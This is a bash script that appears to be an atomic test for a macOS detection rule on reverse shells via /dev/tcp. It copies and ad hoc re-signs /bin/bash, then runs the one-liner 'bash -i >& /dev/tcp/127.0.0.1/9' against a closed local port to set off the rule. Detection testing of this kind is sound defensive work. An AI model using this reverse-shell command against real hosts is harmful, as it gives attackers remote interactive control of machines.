#!/usr/bin/env bash
# Atomic test — rule be06a6b0-fa9f-4df4-9d4a-9f8794037508
#   "macOS Reverse Shell via /dev/tcp"  (process_creation)
#
# The rule matches bash outside the Apple system directories (the stock /bin/bash
# is built without /dev/tcp). Copies /bin/bash to a temporary directory and runs
# the copy with a /dev/tcp stream redirect aimed at a closed local port, so
# nothing connects. A background guard kills it after a couple of seconds.
set -u
DIR=/tmp/rustinel_atomic_devtcp
mkdir -p "$DIR" 2>/dev/null || true
cp /bin/bash "$DIR/bash" 2>/dev/null || true
chmod 0755 "$DIR/bash" 2>/dev/null || true
# A plain copy of an arm64e system binary is killed at exec; re-signing it ad hoc lets it run.
codesign -f -s - "$DIR/bash" >/dev/null 2>&1 || true
"$DIR/bash" -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1' >/dev/null 2>&1 &
pid=$!
sleep 2
kill "$pid" 2>/dev/null || true
wait "$pid" 2>/dev/null || true
rm -rf "$DIR" 2>/dev/null || true
exit 0
